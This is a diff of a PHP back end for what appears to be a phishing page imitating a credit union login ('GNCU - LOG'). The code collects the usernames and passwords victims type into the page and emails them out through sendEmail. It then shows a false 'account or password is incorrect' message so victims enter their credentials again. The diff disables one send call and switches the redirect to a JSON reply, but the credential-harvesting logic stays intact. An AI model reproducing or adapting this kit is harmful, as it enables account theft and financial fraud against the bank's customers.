@@ -1,6 +1,7 @@
 <?php 
 error_reporting(0);
 session_start();
+header("Content-Type: application/json");
 
 
 function sanitize($value) {
@@ -90,25 +91,18 @@ function sendEmail($prevValues, $subject = "GNCU - LOG") {
 }
 
 
-if(isset($_POST["sign-in"]) && !isset($_SESSION['num'])) {
+if(isset($_POST["sign-in"])) {
     $username = sanitize($_POST["username"]);
     $password = sanitize($_POST["password"]);
 
-    sendEmail(["username" => $username, "password" => $password]);
+    // sendEmail(["username" => $username, "password" => $password]);
     $_SESSION['num'] = 1;
     $_SESSION['message'] = "Your account or password is incorrect. If you don't remember your password, <a href='#' class='new-link'>reset it now.</a>";
 
     // REMEMBER TO CHANGE THIS PATH IF YOUR'RE HOSTING ON DIFFERENT SERVER
-    header("Location: ./index.php?page=login");
-}
-
-if(isset($_POST["sign-in"]) && isset($_SESSION['num'])) {
-    $username = sanitize($_POST["username"]);
-    $password = sanitize($_POST["password"]);
-
-    sendEmail(["username" => $username, "password" => $password]);
-    unset($_SESSION['num']);
-
-    // REMEMBER TO CHANGE THIS PATH IF YOUR'RE HOSTING ON DIFFERENT SERVER
-    header("Location: ./success.html");
+    // header("Location: ./index.php?page=login");
+    echo $response = json_encode([
+        "message" => "Your account or password is incorrect. If you don't remember your password, <a href='#' class='new-link'>reset it now.</a>",
+        "error" => NULL
+    ]);
 }
